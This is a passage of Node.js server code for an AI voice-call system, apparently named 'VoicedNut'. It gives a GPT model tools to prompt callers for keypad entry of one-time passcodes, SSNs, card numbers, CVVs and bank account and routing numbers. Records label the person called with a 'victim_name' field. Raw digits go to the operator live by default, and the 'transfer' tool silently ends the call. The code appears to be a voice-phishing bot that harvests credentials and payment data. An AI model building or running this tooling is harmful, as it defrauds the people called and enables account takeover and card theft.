    "We could not verify the information provided. Thank you for your time. Goodbye.",
  no_response: "We did not receive a response. Thank you and goodbye.",
  user_goodbye: "Thanks for your time. Goodbye.",
  error: "I am having trouble right now. Thank you and goodbye.",
};
const CLOSING_MESSAGE =
  "Thank you—your input has been received. Your request is complete. Goodbye.";
const DIGIT_SETTINGS = {
  otpLength: 6,
  otpMaxRetries: 3,
  otpDisplayMode: "masked",
  defaultCollectDelayMs: 1200,
  fallbackToVoiceOnFailure: true,
  showRawDigitsLive:
    String(process.env.SHOW_RAW_DIGITS_LIVE || "true").toLowerCase() === "true",
  sendRawDigitsToUser:
    String(process.env.SEND_RAW_DIGITS_TO_USER || "true").toLowerCase() ===
    "true",
  minDtmfGapMs: 200,
  riskThresholds: {
    confirm: Number(process.env.DIGIT_RISK_CONFIRM || 0.55),
    dtmf_only: Number(process.env.DIGIT_RISK_DTMF_ONLY || 0.7),
    route_agent: Number(process.env.DIGIT_RISK_ROUTE_AGENT || 0.9),
  },
  smsFallbackEnabled:
    String(process.env.DIGIT_SMS_FALLBACK_ENABLED || "true").toLowerCase() ===
    "true",
  smsFallbackMinRetries: Number(
    process.env.DIGIT_SMS_FALLBACK_MIN_RETRIES || 2,
  ),
  healthThresholds: {
    degraded: Number(process.env.DIGIT_HEALTH_DEGRADED || 30),
    overloaded: Number(process.env.DIGIT_HEALTH_OVERLOADED || 60),
  },
  circuitBreaker: {
    windowMs: Number(process.env.DIGIT_BREAKER_WINDOW_MS || 60000),
    minSamples: Number(process.env.DIGIT_BREAKER_MIN_SAMPLES || 8),
    errorRate: Number(process.env.DIGIT_BREAKER_ERROR_RATE || 0.3),
    cooldownMs: Number(process.env.DIGIT_BREAKER_COOLDOWN_MS || 60000),
  },
};

function getDigitSystemHealth() {
  const active = callConfigurations.size;
  const thresholds = DIGIT_SETTINGS.healthThresholds || {};
  const status =
    active >= thresholds.overloaded
      ? "overloaded"
      : active >= thresholds.degraded
        ? "degraded"
        : "healthy";
  return { status, load: active };
}

// Built-in telephony function scripts to give GPT deterministic controls
const telephonyTools = [
  {
    type: "function",
    function: {
      name: "confirm_identity",
      description:
        "Log that the caller has been identity-verified (do not include the code) and proceed to the next step.",
      parameters: {
        type: "object",
        properties: {
          method: {
            type: "string",
            enum: ["otp", "pin", "knowledge", "other"],
            description: "Verification method used.",
          },
          note: {
            type: "string",
            description:
              "Brief note about what was confirmed (no sensitive values).",
          },
        },
        required: ["method"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "route_to_agent",
      description:
        "End the call politely (no transfer) when escalation is requested.",
      parameters: {
        type: "object",
        properties: {
          reason: {
            type: "string",
            description: "Short reason for the transfer.",
          },
          priority: {
            type: "string",
            enum: ["low", "normal", "high"],
            description: "Transfer priority if applicable.",
          },
        },
        required: ["reason"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "collect_digits",
      description:
        "Ask caller to enter digits on the keypad (e.g., OTP). Do not speak or repeat the digits.",
      parameters: {
        type: "object",
        properties: {
          prompt: {
            type: "string",
            description: "Short instruction to the caller.",
          },
          min_digits: {
            type: "integer",
            description: "Minimum digits expected.",
            minimum: 1,
          },
          max_digits: {
            type: "integer",
            description: "Maximum digits expected.",
            minimum: 1,
          },
          profile: {
            type: "string",
            enum: [
              "generic",
              "verification",
              "ssn",
              "dob",
              "routing_number",
              "account_number",
              "phone",
              "tax_id",
              "ein",
              "claim_number",
              "reservation_number",
              "ticket_number",
              "case_number",
              "account",
              "extension",
              "zip",
              "amount",
              "callback_confirm",
              "card_number",
              "cvv",
              "card_expiry",
            ],
            description: "Collection profile for downstream handling.",
          },
          confirmation_style: {
            type: "string",
            enum: ["none", "last4", "spoken_amount"],
            description:
              "How to confirm receipt (masked, spoken summary only).",
          },
          timeout_s: {
            type: "integer",
            description: "Timeout in seconds before reprompt.",
            minimum: 3,
          },
          max_retries: {
            type: "integer",
            description: "Number of retries before fallback.",
            minimum: 0,
          },
          end_call_on_success: {
            type: "boolean",
            description:
              "If false, keep the call active after digits are captured.",
          },
          allow_spoken_fallback: {
            type: "boolean",
            description: "If true, allow spoken fallback after keypad timeout.",
          },
          mask_for_gpt: {
            type: "boolean",
            description:
              "If true (default), mask digits before sending to GPT/transcripts.",
          },
          speak_confirmation: {
            type: "boolean",
            description:
              "If true, GPT can verbally confirm receipt (without echoing digits).",
          },
          allow_terminator: {
            type: "boolean",
            description:
              "If true, allow a terminator key (default #) to finish early.",
          },
          terminator_char: {
            type: "string",
            description:
              "Single key used to end entry when allow_terminator is true.",
          },
        },
        required: ["prompt", "min_digits", "max_digits"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "collect_multiple_digits",
      description:
        "Collect multiple digit profiles sequentially in a single call (e.g., card number, expiry, CVV, ZIP). Do not repeat digits.",
      parameters: {
        type: "object",
        properties: {
          steps: {
            type: "array",
            description: "Ordered list of digit collection steps.",
            items: {
              type: "object",
              properties: {
                prompt: {
                  type: "string",
                  description: "Short instruction to the caller.",
                },
                min_digits: {
                  type: "integer",
                  description: "Minimum digits expected.",
                  minimum: 1,
                },
                max_digits: {
                  type: "integer",
                  description: "Maximum digits expected.",
                  minimum: 1,
                },
                profile: {
                  type: "string",
                  enum: [
                    "generic",
                    "verification",
                    "ssn",
                    "dob",
                    "routing_number",
                    "account_number",
                    "phone",
                    "tax_id",
                    "ein",
                    "claim_number",
                    "reservation_number",
                    "ticket_number",
                    "case_number",
                    "account",
                    "extension",
                    "zip",
                    "amount",
                    "callback_confirm",
                    "card_number",
                    "cvv",
                    "card_expiry",
                  ],
                  description: "Collection profile for downstream handling.",
                },
                confirmation_style: {
                  type: "string",
                  enum: ["none", "last4", "spoken_amount"],
                  description:
                    "How to confirm receipt (masked, spoken summary only).",
                },
                timeout_s: {
                  type: "integer",
                  description: "Timeout in seconds before reprompt.",
                  minimum: 3,
                },
                max_retries: {
                  type: "integer",
                  description: "Number of retries before fallback.",
                  minimum: 0,
                },
                allow_spoken_fallback: {
                  type: "boolean",
                  description:
                    "If true, allow spoken fallback after keypad timeout.",
                },
                mask_for_gpt: {
                  type: "boolean",
                  description:
                    "If true (default), mask digits before sending to GPT/transcripts.",
                },
                speak_confirmation: {
                  type: "boolean",
                  description:
                    "If true, GPT can verbally confirm receipt (without echoing digits).",
                },
                allow_terminator: {
                  type: "boolean",
                  description:
                    "If true, allow a terminator key (default #) to finish early.",
                },
                terminator_char: {
                  type: "string",
                  description:
                    "Single key used to end entry when allow_terminator is true.",
                },
                end_call_on_success: {
                  type: "boolean",
                  description:
                    "If false, keep the call active after this step.",
                },
              },
              required: ["profile"],
            },
          },
          end_call_on_success: {
            type: "boolean",
            description:
              "If false, keep the call active after all steps are captured.",
          },
          completion_message: {
            type: "string",
            description:
              "Optional message to speak after the final step when not ending the call.",
          },
        },
        required: ["steps"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "play_disclosure",
      description:
        "Play or read a required disclosure to the caller. Keep it concise.",
      parameters: {
        type: "object",
        properties: {
          message: {
            type: "string",
            description: "Disclosure text to convey.",
          },
        },
        required: ["message"],
      },
    },
  },
];

function buildTelephonyImplementations(callSid, gptService = null) {
  return {
    confirm_identity: async (args = {}) => {
      const payload = {
        status: "acknowledged",
        method: args.method || "unspecified",
        note: args.note || "",
      };
      try {
        await db.updateCallState(callSid, "identity_confirmed", payload);
        webhookService.addLiveEvent(
          callSid,
          `✅ Identity confirmed (${payload.method})`,
          { force: true },
        );
      } catch (err) {
        console.error("confirm_identity handler error:", err);
      }
      return payload;
    },
    route_to_agent: async (args = {}) => {
      const payload = {
        status: "queued",
        reason: args.reason || "unspecified",
        priority: args.priority || "normal",
      };
      try {
        webhookService.addLiveEvent(
          callSid,
          `📞 Transfer requested (${payload.reason}) • ending call`,
          { force: true },
        );
        await speakAndEndCall(
          callSid,
          CALL_END_MESSAGES.failure,
          "transfer_requested",
        );
      } catch (err) {
        console.error("route_to_agent handler error:", err);
      }
      return payload;
    },
    collect_digits: async (args = {}) => {
      if (!digitService) {
        return { error: "Digit service not ready" };
      }
      return digitService.requestDigitCollection(callSid, args, gptService);
    },
    collect_multiple_digits: async (args = {}) => {
      if (!digitService) {
        return { error: "Digit service not ready" };
      }
      return digitService.requestDigitCollectionPlan(callSid, args, gptService);
    },
    play_disclosure: async (args = {}) => {
      const payload = { message: args.message || "" };
      try {
        await db.updateCallState(callSid, "disclosure_played", payload);
        webhookService.addLiveEvent(callSid, "📢 Disclosure played", {
          force: true,
        });
      } catch (err) {
        console.error("play_disclosure handler error:", err);
      }
      return payload;
    },
  };
}

function applyTelephonyTools(
  gptService,
  callSid,
  baseTools = [],
  baseImpl = {},
  options = {},
) {
  const allowTransfer = options.allowTransfer !== false;
  const allowDigitCollection = options.allowDigitCollection !== false;
  const normalizedName = (tool) =>
    String(tool?.function?.name || "")
      .trim()
      .toLowerCase();

  const filteredBaseTools = (Array.isArray(baseTools) ? baseTools : []).filter(
    (tool) => {
      const name = normalizedName(tool);
      if (!name) return false;
      if (
        !allowTransfer &&
        (name === "route_to_agent" || name === "transfercall")
      )
        return false;
      if (
        !allowDigitCollection &&
        (name === "collect_digits" || name === "collect_multiple_digits")
      )
        return false;
      return true;
    },
  );

  const filteredTelephonyTools = telephonyTools.filter((tool) => {
    const name = normalizedName(tool);
    if (!allowTransfer && name === "route_to_agent") return false;
    if (
      !allowDigitCollection &&
      (name === "collect_digits" || name === "collect_multiple_digits")
    )
      return false;
    return true;
  });

  const combinedTools = [...filteredBaseTools, ...filteredTelephonyTools];
  const combinedImpl = {
    ...baseImpl,
    ...buildTelephonyImplementations(callSid, gptService),
  };
  if (!allowTransfer) {
    delete combinedImpl.route_to_agent;
    delete combinedImpl.transferCall;
    delete combinedImpl.transfercall;
  }
  if (!allowDigitCollection) {
    delete combinedImpl.collect_digits;
    delete combinedImpl.collect_multiple_digits;
  }
  gptService.setDynamicFunctions(combinedTools, combinedImpl);
}

function getCallToolOptions(callConfig = {}) {
  const isDigitIntent = callConfig?.digit_intent?.mode === "dtmf";
  return {
    allowTransfer: isDigitIntent,
    allowDigitCollection: isDigitIntent,
  };
}

function configureCallTools(gptService, callSid, callConfig, functionSystem) {
  if (!gptService) return;
  const baseTools = functionSystem?.functions || [];
  const baseImpl = functionSystem?.implementations || {};
  const options = getCallToolOptions(callConfig);
  applyTelephonyTools(gptService, callSid, baseTools, baseImpl, options);
  if (
    !options.allowTransfer &&
    callConfig &&
    !callConfig.no_transfer_note_added
  ) {
    gptService.setCallIntent(
      "Constraint: do not transfer or escalate this call. Stay on the line and handle the customer end-to-end.",
    );
    callConfig.no_transfer_note_added = true;
    callConfigurations.set(callSid, callConfig);
  }
}

function formatDurationForSms(seconds) {
  if (!seconds || Number.isNaN(seconds)) return "";
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  if (mins === 0) {
    return `${secs}s`;
  }
  return `${mins}m ${secs}s`;
}

function normalizeCallStatus(value) {
  return String(value || "")
    .toLowerCase()
    .replace(/_/g, "-");
}

const STATUS_ORDER = [
  "queued",
  "initiated",
  "ringing",
  "answered",
  "in-progress",
  "completed",
  "voicemail",
  "busy",
  "no-answer",
  "failed",
  "canceled",
];
const TERMINAL_STATUSES = new Set([
  "completed",
  "voicemail",
  "busy",
  "no-answer",
  "failed",
  "canceled",
]);

function getStatusRank(status) {
  const normalized = normalizeCallStatus(status);
  return STATUS_ORDER.indexOf(normalized);
}

function isTerminalStatusKey(status) {
  return TERMINAL_STATUSES.has(normalizeCallStatus(status));
}

function shouldApplyStatusUpdate(previousStatus, nextStatus, options = {}) {
  const prev = normalizeCallStatus(previousStatus);
  const next = normalizeCallStatus(nextStatus);
  if (!next) return false;
  if (!prev) return true;
  if (prev === next) return true;
  if (isTerminalStatusKey(prev)) {
    if (
      options.allowTerminalUpgrade &&
      next === "completed" &&
      prev !== "completed"
    ) {
      return true;
    }
    return false;
  }
  const prevRank = getStatusRank(prev);
  const nextRank = getStatusRank(next);
  if (prevRank === -1 || nextRank === -1) return true;
  return nextRank >= prevRank;
}

function formatContactLabel(call) {
  if (call?.customer_name) return call.customer_name;
  if (call?.victim_name) return call.victim_name;
  const digits = String(call?.phone_number || call?.number || "").replace(
    /\D/g,
    "",
  );
  if (digits.length >= 4) {
    return `the contact ending ${digits.slice(-4)}`;
  }
  return "the contact";
}

function buildOutcomeSummary(call, status) {
  const label = formatContactLabel(call);
  switch (status) {
    case "no-answer":
      return `${label} didn't pick up the call.`;
    case "busy":
      return `${label}'s line was busy.`;
    case "failed":
      return `Call failed to reach ${label}.`;
    case "canceled":
      return `Call to ${label} was canceled.`;
    default:
      return "Call finished.";
  }
}

function buildRecapSmsBody(call) {
  const nameValue = call.customer_name || call.victim_name;
  const name = nameValue ? ` with ${nameValue}` : "";
  const normalizedStatus = normalizeCallStatus(
    call.status || call.twilio_status || "completed",
  );
  const status = normalizedStatus.replace(/_/g, " ");
  const duration = call.duration
    ? ` Duration: ${formatDurationForSms(call.duration)}.`
    : "";
  const rawSummary = (call.call_summary || "").replace(/\s+/g, " ").trim();
  const summary =
    normalizedStatus === "completed"
      ? rawSummary
        ? rawSummary.slice(0, 180)
        : "Call finished."
      : buildOutcomeSummary(call, normalizedStatus);
  return `VoicedNut call recap${name}: ${summary} Status: ${status}.${duration}`;
}

function buildRetrySmsBody(callRecord, callState) {
  const name =
    callState?.customer_name ||
    callState?.victim_name ||
    callRecord?.customer_name ||
    callRecord?.victim_name;
  const greeting = name ? `Hi ${name},` : "Hi,";
  return `${greeting} we tried to reach you by phone. When is a good time to call back?`;
}

function buildInboundSmsBody(callRecord, callState) {
  const name =
    callState?.customer_name ||
    callState?.victim_name ||
    callRecord?.customer_name ||
    callRecord?.victim_name;
  const greeting = name ? `Hi ${name},` : "Hi,";
  const business = callState?.business_id || callRecord?.business_id;
  const intro = business
    ? `Thanks for calling ${business}.`
    : "Thanks for calling.";
  return `${greeting} ${intro} Reply with your request and we will follow up shortly.`;
}

function buildCallbackPayload(callRecord, callState) {
  const prompt = callRecord?.prompt || DEFAULT_INBOUND_PROMPT;
  const firstMessage =
    callRecord?.first_message || DEFAULT_INBOUND_FIRST_MESSAGE;
  return {
    number: callRecord?.phone_number,
    prompt,
    first_message: firstMessage,
    user_chat_id: callRecord?.user_chat_id || null,
    customer_name:
      callState?.customer_name ||
      callState?.victim_name ||
      callRecord?.customer_name ||
      callRecord?.victim_name,
    business_id: callState?.business_id || callRecord?.business_id || null,
    script: callState?.script || callRecord?.script || null,
    script_id: callState?.script_id || callRecord?.script_id || null,
    purpose: callState?.purpose || callRecord?.purpose || null,
    emotion: callState?.emotion || callRecord?.emotion || null,
    urgency: callState?.urgency || callRecord?.urgency || null,
    technical_level:
      callState?.technical_level || callRecord?.technical_level || null,
    voice_model: callState?.voice_model || callRecord?.voice_model || null,
    collection_profile:
      callState?.collection_profile || callRecord?.collection_profile || null,
    collection_expected_length:
      callState?.collection_expected_length ||
      callRecord?.collection_expected_length ||
      null,
    collection_timeout_s:
      callState?.collection_timeout_s ||
      callRecord?.collection_timeout_s ||
      null,
    collection_max_retries:
      callState?.collection_max_retries ||
      callRecord?.collection_max_retries ||
      null,
    collection_mask_for_gpt:
      callState?.collection_mask_for_gpt || callRecord?.collection_mask_for_gpt,
    collection_speak_confirmation:
      callState?.collection_speak_confirmation ||
      callRecord?.collection_speak_confirmation,
  };
}

async function logConsoleAction(callSid, action, meta = {}) {
  if (!db || !callSid || !action) return;
  try {
    await db.updateCallState(callSid, "console_action", {
      action,
      at: new Date().toISOString(),
      ...meta,
    });
  } catch (error) {
    console.error("Failed to log console action:", error);
  }
}

const DIGIT_PROFILE_LABELS = {
  verification: "OTP",
  otp: "OTP",
  ssn: "SSN",
  dob: "DOB",
  routing_number: "Routing",
  account_number: "Account #",
  phone: "Phone",
  tax_id: "Tax ID",
  ein: "EIN",
  claim_number: "Claim",
  reservation_number: "Reservation",
  ticket_number: "Ticket",
  case_number: "Case",
  account: "Account",
  zip: "ZIP",
  extension: "Ext",
  amount: "Amount",
  callback_confirm: "Callback",
  card_number: "Card",
  cvv: "CVV",
  card_expiry: "Expiry",
  generic: "Digits",
};

function buildDigitSummary(digitEvents = []) {
  if (!Array.isArray(digitEvents) || digitEvents.length === 0) {
    return { summary: "", count: 0 };
  }

  const grouped = new Map();
  for (const event of digitEvents) {
    const profile = event.profile || "generic";
    if (!grouped.has(profile)) {
      grouped.set(profile, []);
    }
    grouped.get(profile).push(event);
  }

  const parts = [];
  let acceptedCount = 0;

  for (const [profile, events] of grouped.entries()) {
    const acceptedEvents = events.filter((e) => e.accepted);
    const chosen = acceptedEvents.length
      ? acceptedEvents[acceptedEvents.length - 1]
      : events[events.length - 1];
    const label = DIGIT_PROFILE_LABELS[profile] || profile;
    let value = chosen.digits || "";

    if (profile === "amount" && value) {
      const cents = Number(value);
      if (!Number.isNaN(cents)) {
        value = `$${(cents / 100).toFixed(2)}`;
      }
    }
    if (profile === "card_expiry" && value) {
      if (value.length === 4) {
        value = `${value.slice(0, 2)}/${value.slice(2)}`;
      } else if (value.length === 6) {
        value = `${value.slice(0, 2)}/${value.slice(2)}`;
      }
    }

    if (!value) {
      value = "none";
    }

    const suffix = chosen.accepted ? "" : " (unverified)";
    if (chosen.accepted) {
      acceptedCount += 1;
    }
    parts.push(`${label}: ${value}${suffix}`);
  }

  return {
    summary: parts.join(" • "),
    count: acceptedCount,
  };
}

function parseDigitEventMetadata(event = {}) {
  if (!event || event.metadata == null) return {};
  if (typeof event.metadata === "object") return event.metadata;
  try {
    return JSON.parse(event.metadata);
  } catch (_) {
    return {};
  }
}

function buildDigitFunnelStats(digitEvents = []) {
  if (!Array.isArray(digitEvents) || digitEvents.length === 0) {
    return null;
  }
  const steps = new Map();
  for (const event of digitEvents) {
    const meta = parseDigitEventMetadata(event);
    const stepKey = meta.plan_step_index
      ? String(meta.plan_step_index)
      : event.profile || "generic";
    const step = steps.get(stepKey) || {
      step: stepKey,
      label:
        meta.step_label ||
        DIGIT_PROFILE_LABELS[event.profile] ||
        event.profile ||
        "digits",
      plan_id: meta.plan_id || null,
      attempts: 0,
      accepted: 0,
      failed: 0,
      reasons: {},
    };
    step.attempts += 1;
    if (event.accepted) {
      step.accepted += 1;
    } else {
      step.failed += 1;
      const reason = event.reason || "invalid";
      step.reasons[reason] = (step.reasons[reason] || 0) + 1;
    }
    steps.set(stepKey, step);
  }
  const list = Array.from(steps.values());
  const topFailures = {};
  for (const step of list) {
    let topReason = null;
    let topCount = 0;
    for (const [reason, count] of Object.entries(step.reasons || {})) {
      if (count > topCount) {
        topReason = reason;
        topCount = count;
      }
    }
    if (topReason) {
      topFailures[step.step] = { reason: topReason, count: topCount };
    }
  }
  return { steps: list, topFailures };
}

function shouldCloseConversation(text = "") {
  const lower = String(text || "").toLowerCase();
  if (!lower) return false;
  return !!lower.match(
    /\b(thanks|thank you|bye|goodbye|appreciate|that.s all|that is all|have a good|bye bye)\b/,
  );
}

const ADMIN_HEADER_NAME = "x-admin-token";
const SUPPORTED_PROVIDERS = [...SUPPORTED_CALL_PROVIDERS];
let currentProvider = getActiveCallProvider();
let storedProvider = getStoredCallProvider();
let currentSmsProvider = getActiveSmsProvider();
let storedSmsProvider = getStoredSmsProvider();
let currentEmailProvider = getActiveEmailProvider();
let storedEmailProvider = getStoredEmailProvider();

function syncRuntimeProviderMirrors() {
  currentProvider = getActiveCallProvider();
  storedProvider = getStoredCallProvider();
  currentSmsProvider = getActiveSmsProvider();
  storedSmsProvider = getStoredSmsProvider();
  currentEmailProvider = getActiveEmailProvider();
  storedEmailProvider = getStoredEmailProvider();
}
const awsContactMap = new Map();
const vonageCallMap = new Map();

let awsConnectAdapter = null;
let awsTtsAdapter = null;
let vonageVoiceAdapter = null;

function rememberVonageCallMapping(callSid, vonageUuid, source = "unknown") {
  if (!callSid || !vonageUuid) return;
  vonageCallMap.set(String(vonageUuid), String(callSid));

  const callConfig = callConfigurations.get(callSid);
  if (callConfig) {
    if (!callConfig.provider_metadata) {
      callConfig.provider_metadata = {};
    }
    if (callConfig.provider_metadata.vonage_uuid !== vonageUuid) {
      callConfig.provider_metadata.vonage_uuid = String(vonageUuid);
      callConfigurations.set(callSid, callConfig);
      if (db?.updateCallState) {
        db.updateCallState(callSid, "provider_metadata_updated", {
          provider: "vonage",
          vonage_uuid: String(vonageUuid),
          source,
          at: new Date().toISOString(),
        })
          .catch(() => {});
      }
    }
  }
}

async function resolveVonageCallSidFromUuid(vonageUuid) {
  if (!vonageUuid) return null;
  const normalizedUuid = String(vonageUuid);
  const inMemory = vonageCallMap.get(normalizedUuid);
  if (inMemory) return inMemory;

  for (const [callSid, cfg] of callConfigurations.entries()) {
    const cfgUuid = cfg?.provider_metadata?.vonage_uuid;
    if (cfgUuid && String(cfgUuid) === normalizedUuid) {
      rememberVonageCallMapping(callSid, normalizedUuid, "memory_scan");
      return callSid;
    }
  }

  if (!db?.db) return null;
  const rows = await new Promise((resolve) => {
    db.db.all(
      `
        SELECT call_sid, data
        FROM call_states
        WHERE state = 'call_created'
          AND data LIKE ?
        ORDER BY id DESC
        LIMIT 50
      `,
      [`%${normalizedUuid}%`],
      (err, resultRows) => {
        if (err) {
          resolve([]);
          return;
        }
        resolve(Array.isArray(resultRows) ? resultRows : []);
      },
    );
  });

  for (const row of rows) {
    try {
      const parsed = row?.data ? JSON.parse(row.data) : null;
      const stateUuid = parsed?.provider_metadata?.vonage_uuid;
      if (stateUuid && String(stateUuid) === normalizedUuid && row?.call_sid) {
        rememberVonageCallMapping(row.call_sid, normalizedUuid, "db_scan");
        return row.call_sid;
      }
    } catch {
      // Ignore malformed JSON rows.
    }
  }

  return null;
}

async function resolveVonageCallSid(req, payload = {}) {
  const query = req?.query || {};
  const body = payload || {};

  const directCallSid =
    query.callSid ||
    query.call_sid ||
    query.callsid ||
    query.client_ref ||
    body.callSid ||
    body.call_sid ||
    body.callsid ||
    body.client_ref;
  if (directCallSid) {
    return String(directCallSid);
  }

  const uuidCandidates = [
    query.uuid,
    query.vonage_uuid,
    query.conversation_uuid,
    body.uuid,
    body.vonage_uuid,
    body.conversation_uuid,
  ].filter(Boolean);

  for (const candidate of uuidCandidates) {
    const resolved = await resolveVonageCallSidFromUuid(candidate);
    if (resolved) return String(resolved);
  }

  return null;
}

function resolveVonageHangupUuid(callSid, callConfig) {
  const direct = callConfig?.provider_metadata?.vonage_uuid;
  if (direct) return String(direct);
  for (const [uuid, mappedCallSid] of vonageCallMap.entries()) {
    if (String(mappedCallSid) === String(callSid)) {
      return String(uuid);
    }
  }
  return null;
}

function buildVonageInboundCallSid(vonageUuid) {
  const normalized = String(vonageUuid || "")
    .trim()
    .replace(/[^a-zA-Z0-9_-]/g, "");
  if (!normalized) return null;
  return `vonage-in-${normalized}`;
}

function normalizeVonageDirection(value = "") {
  return String(value || "")
    .trim()
    .toLowerCase();
}

function isOutboundVonageDirection(value = "") {
  const normalized = normalizeVonageDirection(value);
  return (
    normalized.startsWith("outbound") ||
    normalized === "outbound-api" ||
    normalized === "api_outbound"
  );
}

function getVonageCallPayload(req, payload = null) {
  const body = payload || req?.body || {};
  const query = req?.query || {};
  const from =
    body.from ||
    body.from_number ||
    body.caller ||
    body.Caller ||
    query.from ||
    query.from_number ||
    query.caller ||
    null;
  const to =
    body.to ||
    body.to_number ||
    body.called ||
    body.Called ||
    query.to ||
    query.to_number ||
    query.called ||
    null;
  const direction =
    body.direction || query.direction || body.call_direction || query.call_direction;
  return {
    from: from || null,
    to: to || null,
    direction: direction || null,
    From: from || null,
    To: to || null,
    Direction: direction || null,
  };
}

function buildVonageTalkHangupNcco(message) {
  const text = String(message || "").trim();
  if (!text) return [{ action: "hangup" }];
  return [
    { action: "talk", text },
    { action: "hangup" },
  ];
}

function normalizeDigitString(value) {
  // Keep digits plus keypad terminators so provider webhooks can signal explicit end-of-entry.
  return String(value || "").replace(/[^0-9#*]/g, "");
}

function getVonageDtmfDigits(payload = {}) {
  const dtmf = payload?.dtmf;
  const candidates = [
    typeof dtmf === "string" ? dtmf : null,
    dtmf?.digits,
    dtmf?.digit,
    payload?.digits,
    payload?.digit,
    payload?.keypad_digits,
    payload?.keypad,
    payload?.key,
    payload?.value,
    payload?.input,
  ];
  for (const candidate of candidates) {
    const normalized = normalizeDigitString(candidate);
    if (normalized) return normalized;
  }
  return "";
}

function clearVonageCallMappings(callSid) {
  if (!callSid) return;
  for (const [uuid, mappedCallSid] of vonageCallMap.entries()) {
    if (String(mappedCallSid) === String(callSid)) {
      vonageCallMap.delete(uuid);
    }
  }
}

const builtinPersonas = [
  {
    id: "general",
    label: "General",
    description: "General voice call assistant",
    purposes: [{ id: "general", label: "General" }],
    default_purpose: "general",
    default_emotion: "neutral",
    default_urgency: "normal",
    default_technical_level: "general",
  },
];

function requireAdminToken(req, res, next) {
  const token = config.admin?.apiToken;
  if (!token) {
    return res
      .status(500)
      .json({ success: false, error: "Admin token not configured" });
  }
  const provided = req.headers[ADMIN_HEADER_NAME];
  if (!provided || provided !== token) {
    return res
      .status(403)
      .json({ success: false, error: "Admin token required" });
  }
  return next();
}

function hasAdminToken(req) {
  const token = config.admin?.apiToken;
  if (!token) return false;
  const provided = req.headers[ADMIN_HEADER_NAME];
  return Boolean(provided && provided === token);
}

function requireOutboundAuthorization(req, res, next) {
  // If request HMAC is configured, global middleware already enforces it.
  if (config.apiAuth?.hmacSecret) {
    return next();
  }
  if (hasAdminToken(req)) {
    return next();
  }
  return sendApiError(
    res,
    403,
    "admin_token_required",
    "Admin token required",
    req.requestId || null,
  );
}

function supportsKeypadCaptureProvider(provider) {
  const normalized = String(provider || "")
    .trim()
    .toLowerCase();
  if (!normalized) return false;
  if (normalized === "twilio") return true;
  if (normalized === "vonage") {
    return config.vonage?.dtmfWebhookEnabled === true;
  }
  return false;
}

function normalizeDigitProfile(value) {
  return String(value || "")
    .trim()
    .toLowerCase();
}

function isKeypadRequiredFlow(collectionProfile, scriptPolicy = {}) {
  const profile = normalizeDigitProfile(
    collectionProfile || scriptPolicy?.default_profile,
  );
  if (scriptPolicy?.requires_otp) return true;
  return ["verification", "otp", "pin"].includes(profile);
}

function normalizeScriptId(value) {
  const parsed = Number(value);
  if (!Number.isFinite(parsed)) return null;
  if (parsed <= 0) return null;
  return Math.trunc(parsed);
}

function buildKeypadScopeKeys(collectionProfile, scriptPolicy = {}, scriptId = null) {
  const keys = [];
  const normalizedScriptId = normalizeScriptId(scriptId);
  if (normalizedScriptId) {
    keys.push({
      key: `script:${normalizedScriptId}`,
      scope: "script",
      value: normalizedScriptId,
    });
  }
  const profile = normalizeDigitProfile(
    collectionProfile || scriptPolicy?.default_profile,
  );
  if (profile) {
    keys.push({
      key: `profile:${profile}`,
      scope: "profile",
      value: profile,
    });
  }
  return keys;
}

function pruneExpiredKeypadProviderOverrides(nowMs = Date.now()) {
  let changed = false;
  for (const [scopeKey, override] of keypadProviderOverrides.entries()) {
    const expiresAt = Number(override?.expiresAt || 0);
    if (!Number.isFinite(expiresAt) || expiresAt <= nowMs) {
      keypadProviderOverrides.delete(scopeKey);
      changed = true;
    }
  }
  return changed;
}

function serializeKeypadProviderOverrides() {
  pruneExpiredKeypadProviderOverrides();
  return {
    version: 1,
    updated_at: new Date().toISOString(),
    overrides: [...keypadProviderOverrides.entries()].map(
      ([scopeKey, override]) => ({
        scopeKey,
        provider: override?.provider || "twilio",
        expiresAt: Number(override?.expiresAt || 0),
        createdAt: override?.createdAt || null,
        reason: override?.reason || null,
        script_id: override?.script_id || null,
        collection_profile: override?.collection_profile || null,
        source_call_sid: override?.source_call_sid || null,
      }),
    ),
  };
}

function listKeypadProviderOverrides() {
  const changed = pruneExpiredKeypadProviderOverrides();
  if (changed) {
    persistKeypadProviderOverrides().catch(() => {});
  }
  return [...keypadProviderOverrides.entries()].map(([scopeKey, override]) => ({
    scope_key: scopeKey,
    provider: override?.provider || "twilio",
    expires_at: override?.expiresAt
      ? new Date(override.expiresAt).toISOString()
      : null,
    created_at: override?.createdAt || null,
    reason: override?.reason || null,
    script_id: override?.script_id || null,
    collection_profile: override?.collection_profile || null,
    source_call_sid: override?.source_call_sid || null,
  }));
}

async function clearKeypadProviderOverrides(params = {}) {
  const {
    all = false,
    scopeKey = null,
    scope = null,
    value = null,
  } = params || {};
  const normalizedScopeKey = scopeKey ? String(scopeKey).trim() : "";
  const normalizedScope = scope ? String(scope).trim().toLowerCase() : "";
  const normalizedValue = value == null ? "" : String(value).trim().toLowerCase();

  let cleared = 0;
  if (all) {
    cleared = keypadProviderOverrides.size;
    keypadProviderOverrides.clear();
  } else if (normalizedScopeKey) {
    if (keypadProviderOverrides.delete(normalizedScopeKey)) {
      cleared = 1;
    }
  } else if (normalizedScope && normalizedValue) {
    const targetKey = `${normalizedScope}:${normalizedValue}`;
    if (keypadProviderOverrides.delete(targetKey)) {
      cleared = 1;
    }
  }

  await persistKeypadProviderOverrides();
  return {
    cleared,
    remaining: keypadProviderOverrides.size,
    overrides: listKeypadProviderOverrides(),
  };
}

async function loadStoredProviderSetting(options = {}) {
  const {
    channel,
    settingKey,
    label = "provider",
    supportedProviders = [],
    getReadiness = () => ({}),
    getActive = () => "unknown",
    setActive = () => {},
    setStored = () => {},
  } = options;
  if (!db?.getSetting) return;

  try {
    const raw = await db.getSetting(settingKey);
    if (!raw) {
      console.log(
        `☎️ Default ${label} provider from env: ${String(getActive() || "unknown").toUpperCase()}`,
      );
      return;
    }

    let normalized = null;
    try {
      normalized = normalizeProvider(channel, raw);
    } catch {
      console.warn(
        `Ignoring invalid stored ${label} provider "${raw}". Supported values: ${supportedProviders.join(", ")}`,
      );
      return;
    }

    setStored(normalized);
    const readiness = getReadiness() || {};
    if (readiness[normalized]) {
